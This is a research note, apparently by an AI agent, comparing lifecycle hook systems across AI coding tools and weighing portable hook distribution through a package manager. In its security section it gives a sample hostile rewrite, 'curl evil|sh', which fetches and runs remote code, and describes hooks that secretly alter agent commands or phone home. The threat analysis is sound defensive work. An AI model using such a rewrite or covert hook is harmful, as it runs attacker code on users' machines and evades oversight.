# Research: AI Coding Tool Lifecycle Hooks (cross-IDE)

**Date:** 2026-06-03
**Author:** worker-researcher (via /architect)
**Question:** Can a package manager distribute portable "hooks" (lifecycle
event handlers that run commands at agent events) across different IDEs/agents?
What are the per-tool differences?

## TL;DR

Seven of eight surveyed tools have real hook systems with a recognizable
**shared shape** — shell command + JSON on stdin + `exit 2` to block — but
**divergent schemas** (event names, config location, naming convention,
handler types). Continue.dev and Aider have no hook target. Zed has task hooks
only (AI-agent hooks proposed, unshipped). A portable hook abstraction is
**viable for the common core** (before-tool / after-tool / session-start) but
needs **per-target translation** and degrades for category-event tools
(Windsurf) and no-hook tools (Continue, Aider).

## Tool-by-tool summary

### Claude Code (reference implementation)
- **Config:** `~/.claude/settings.json`, `.claude/settings.json`,
  `.claude/settings.local.json`, managed policy, plugin frontmatter `hooks:`
- **Events (30+):** `SessionStart`, `SessionEnd`, `UserPromptSubmit`,
  `PreToolUse`, `PostToolUse`, `PostToolUseFailure`, `PreCompact`,
  `PostCompact`, `Stop`, `SubagentStart`, `SubagentStop`, `Notification`,
  plus unique: `FileChanged`, `CwdChanged`, `WorktreeCreate/Remove`,
  `InstructionsLoaded`, `ConfigChange`, `Elicitation`, `TaskCreated/Completed`
- **Handler types:** `command`, `http`, `mcp_tool`, `prompt`, `agent`
- **Schema:** `{ "hooks": { "PreToolUse": [ { "matcher": "Bash|Edit",
  "hooks": [ { "type": "command", "command": "...", "timeout": 600 } ] } ] } }`
- **Exec:** stdin JSON (`session_id`, `transcript_path`, `cwd`,
  `hook_event_name`, …); exit 0 ok, exit 2 block (fed to Claude), other =
  non-blocking error; `async: true` for fire-and-forget
- **Matcher:** empty = all; alphanumeric/`|` = exact list; else JS regex; MCP
  tools as `mcp__<server>__<tool>`
- **Security:** no sandbox; `allowManagedHooksOnly` enterprise policy;
  per-hook `allowedEnvVars` for HTTP

### Cursor (beta, v1.7 ~Oct 2025)
- **Config:** `.cursor/hooks.json`, `~/.cursor/hooks.json`, enterprise paths
- **Events (~20, camelCase):** `sessionStart`, `sessionEnd`, `preToolUse`,
  `postToolUse`, `subagentStart/Stop`, `beforeShellExecution`,
  `beforeMCPExecution`, `beforeReadFile`, `afterFileEdit`,
  `beforeSubmitPrompt`, `preCompact`, `stop`, `afterAgentResponse`
- **Handler types:** `command`, `prompt`
- **Exec:** stdin JSON (`conversation_id`, `generation_id`, `model`,
  `workspace_roots`, …); exit 0 ok, exit 2 block, other fail-open unless
  `failClosed: true`; cloud agents support command hooks only
- **Security:** workspace trust required; enterprise MDM override

### Windsurf (Codeium Cascade)
- **Config:** `.windsurf/hooks.json`, `~/.codeium/windsurf/hooks.json`, system
- **Events (12, snake_case, category-based):** `pre_read_code`,
  `post_read_code`, `pre_write_code`, `post_write_code`, `pre_run_command`,
  `post_run_command`, `pre_mcp_tool_use`, `post_mcp_tool_use`,
  `pre_user_prompt`, `post_cascade_response`,
  `post_cascade_response_with_transcript`, `post_setup_worktree`
- **Schema:** `command` + optional `powershell`, `show_output`,
  `working_directory`
- **Exec:** stdin JSON; exit 0 proceed, exit 2 block (pre-hooks only); post
  hooks async/non-blocking
- **Note:** events are **semantically categorized** (read/write/command/mcp),
  NOT generic `PreToolUse` + matcher — you lose matcher expressivity

### GitHub Copilot (Preview, VS Code + CLI)
- **Config:** `.github/hooks/*.json`, `~/.copilot/hooks/`; also accepts
  `.claude/settings.json` compat format
- **Events (13, camelCase + PascalCase aliases):** `sessionStart`,
  `sessionEnd`, `userPromptSubmitted`, `preToolUse`, `postToolUse`,
  `postToolUseFailure`, `agentStop`, `subagentStart/Stop`, `errorOccurred`,
  `preCompact`, `permissionRequest`, `notification`
- **Handler types:** shell (`bash`/`powershell`/`command`), `http`
- **Exec:** stdin JSON (two dialects); `preToolUse` **fail-closed** (unique);
  HTTPS-only HTTP hooks; cloud agent ephemeral sandbox
- **Security:** strongest network controls of the set (HTTPS enforced)

### OpenAI Codex CLI
- **Config:** `~/.codex/hooks.json`, `.codex/hooks.json`, `config.toml`
  `[hooks]`
- **Events (10, PascalCase):** `SessionStart`, `SubagentStart`, `PreToolUse`,
  `PermissionRequest`, `PostToolUse`, `PreCompact`, `PostCompact`,
  `UserPromptSubmit`, `SubagentStop`, `Stop`
- **Schema:** mirrors Claude Code (`matcher` + nested `hooks` array); TOML
  alternative
- **Security:** **explicit trust model** — non-managed hooks hash-verified +
  require `/hooks` approval before first run; `requirements.toml` for managed
  hooks; `--dangerously-bypass-hook-trust`. Most explicit trust-gating of set.

### Gemini CLI
- **Config:** `.gemini/settings.json`, `~/.gemini/settings.json`
- **Events (11):** `BeforeTool`, `AfterTool`, `BeforeAgent`, `AfterAgent`,
  `BeforeModel`, `AfterModel`, `BeforeToolSelection`, `SessionStart`,
  `SessionEnd`, `Notification`, `PreCompress`
- **Unique:** `BeforeModel`/`AfterModel` (intercept LLM call),
  `BeforeToolSelection` (filter tools before planning); **parallel** hook
  execution (`sequential: false` default); timeout in **milliseconds**
- **Security:** project hook commands **fingerprinted**, warns on change;
  extensions system for distribution

### Kiro (Amazon, 2025)
- **Events (10, camelCase):** `promptSubmit`, `agentStop`, `preToolUse`,
  `postToolUse`, `fileCreate`, `fileSave`, `fileDelete`, `preTaskExecution`,
  `postTaskExecution`, manual
- **Unique:** file-watch triggers + spec/task hooks; `timeout_ms`
- **Security:** not fully documented

### Continue.dev — **no hooks**
Extension points limited to model/context providers, MCP, slash commands,
static rules. No event emission.

### Zed — **partial** (task hooks only)
`tasks.json` `hooks` supports `create_worktree` only. AI-agent lifecycle hooks
proposed in discussion #57943, unshipped.

### Aider — **no AI hooks** (git hooks passthrough only)
`--auto-lint`/`--auto-test`, `--no-verify` to git; delegates to `.git/hooks/`.

## Comparison matrix

| Tool | Hooks | Config | Events | Naming | Handlers | Block | Security |
|---|---|---|---|---|---|---|---|
| Claude Code | Yes (mature) | `.claude/settings.json` | 30+ | Pascal | command/http/mcp_tool/prompt/agent | exit 2 | enterprise lockdown |
| Cursor | Yes (beta) | `.cursor/hooks.json` | ~20 | camel | command/prompt | exit 2 / failClosed | workspace trust |
| Windsurf | Yes | `.windsurf/hooks.json` | 12 | snake | command | exit 2 (pre only) | 3-tier precedence |
| Copilot | Yes (preview) | `.github/hooks/*.json` | 13 | camel(+Pascal) | command/http | exit 2; preTool fail-closed | HTTPS-only |
| Codex CLI | Yes | `.codex/hooks.json`/`config.toml` | 10 | Pascal | command | exit 2 | hash trust + `/hooks` approval |
| Gemini CLI | Yes | `.gemini/settings.json` | 11 | Pascal | command | exit 2 / decision | fingerprint warn |
| Kiro | Yes | `.kiro/` | 10 | camel | command | n/d | n/d |
| Continue | No | — | 0 | — | — | — | — |
| Zed | Partial | `tasks.json` | 1 | snake | command | — | proposed |
| Aider | No | — | 0 | — | — | — | git passthrough |

## Portability analysis

### Common core (present in 5+ tools)
| Canonical concept | Claude | Cursor | Windsurf | Copilot | Codex | Gemini |
|---|---|---|---|---|---|---|
| session-start | `SessionStart` | `sessionStart` | — | `sessionStart` | `SessionStart` | `SessionStart` |
| pre-tool | `PreToolUse` | `preToolUse` | `pre_*_code`… | `preToolUse` | `PreToolUse` | `BeforeTool` |
| post-tool | `PostToolUse` | `postToolUse` | `post_*_code`… | `postToolUse` | `PostToolUse` | `AfterTool` |
| stop | `Stop` | `stop` | — | `agentStop` | `Stop` | `AfterAgent` |
| pre-compact | `PreCompact` | `preCompact` | — | `preCompact` | `PreCompact` | `PreCompress` |
| prompt-submit | `UserPromptSubmit` | `beforeSubmitPrompt` | `pre_user_prompt` | `userPromptSubmitted` | `UserPromptSubmit` | — |

### Lowest common denominator (portable hook contract)
1. shell command/script (every tool supports it)
2. JSON on stdin
3. `exit 0` allow, `exit 2` block
4. JSON on stdout (not mixed text)
5. maps to: pre-tool, post-tool, session-start (present in all hook tools)

stdin field names diverge: session id is `session_id` (Claude/Codex/Gemini)
vs `conversation_id` (Cursor) vs `trajectory_id` (Windsurf); timestamps Unix-ms
vs ISO-8601. A thin shim normalizing on `hook_event_name` absorbs this.

### Friction points
- **Windsurf category events** can't express `PreToolUse(matcher=Bash)` — lose
  matcher power.
- **Handler types** differ — only Claude/Copilot support `http`; only Claude
  supports `mcp_tool`/`agent`.
- **Naming** trivially translated but per-tool.
- **Continue/Aider** have no target → skip + flag. **Zed** future shim.

### Can a package manager distribute portable hooks?
**Yes, with per-target adaptation.** Model: canonical hook definition (event
concept + script ref + matcher + portability tier) → per-target translator
emitting the right config + the shared script. Realistic single-definition
coverage today: **Claude Code, Cursor, Copilot, Codex** (matcher-based,
Pascal/camel). Windsurf + Gemini need adapter logic. Continue/Aider unsupported.

## Security considerations (package manager distributing hooks)

**Core risk:** hooks are arbitrary code execution at user privilege, firing
hundreds of times per session (PreToolUse). Equivalent to distributing shell
scripts via npm, but higher execution frequency + a unique escalation path:

- **Agent-loop injection:** a `PreToolUse` hook can return `modifiedInput`,
  silently rewriting the command Claude is about to run (`cargo build` →
  `curl evil|sh`). Not a generic shell-script risk.
- **Supply-chain on update:** new version = new hash → trust reset (Codex
  model) → re-approval friction, but correct.
- **Scope creep:** a "linter" PostToolUse hook can phone home on every edit.

**How tools mitigate:** Codex hash-trust + `/hooks` approval; Gemini
fingerprint-warn; Cursor workspace trust; Copilot HTTPS-only + cloud sandbox;
Claude `allowManagedHooksOnly` + `allowedEnvVars`.

**Recommended for Grimoire:**
- Sign hook manifests (Sigstore/cosign), verify at install.
- **Explicit user approval on first activation** and on any command/hash change
  (Codex model).
- Separate **observer** (read-only) vs **gatekeeper** (blocking) tiers in the
  manifest — different risk classes.
- `grim hooks list` showing active hooks, source, last-verified hash.
- **Default to NOT auto-registering** — registration into a config that runs on
  every invocation must be an explicit opt-in.

## Industry context

- **Trending toward critical mass:** Claude Code (2024) → Cursor, Copilot,
  Codex, Windsurf, Gemini within 12–18 months; new tools (Kiro) ship hooks at
  launch.
- **Settled primitive:** shell + stdin-JSON + exit-2-block, converged
  independently.
- **Emerging:** LLM-as-gatekeeper (`prompt`/`agent` handlers); Gemini
  `BeforeModel`/`BeforeToolSelection`.
- **Gap = opportunity:** no tool offers a *portable* hook abstraction. A
  package manager that installs one definition and emits correct config per
  target solves a real gap for the common cases (security gates, formatters,
  audit loggers).

## Sources
- Claude Code Hooks — https://code.claude.com/docs/en/hooks
- Cursor Hooks — https://cursor.com/docs/hooks ; https://blog.gitbutler.com/cursor-hooks-deep-dive ; https://www.infoq.com/news/2025/10/cursor-hooks/
- Windsurf Cascade Hooks — https://docs.devin.ai/desktop/cascade/hooks
- GitHub Copilot Hooks — https://docs.github.com/en/copilot/reference/hooks-reference ; https://code.visualstudio.com/docs/agent-customization/hooks
- OpenAI Codex Hooks — https://developers.openai.com/codex/hooks
- Gemini CLI Hooks — https://github.com/google-gemini/gemini-cli/blob/main/docs/hooks/reference.md
- Kiro Hooks — https://kiro.dev/docs/hooks/types/
- Zed discussion #57943 — https://github.com/zed-industries/zed/discussions/57943
- Aider — https://aider.chat/docs/config/options.html
- Continue.dev — https://docs.continue.dev/customize/overview
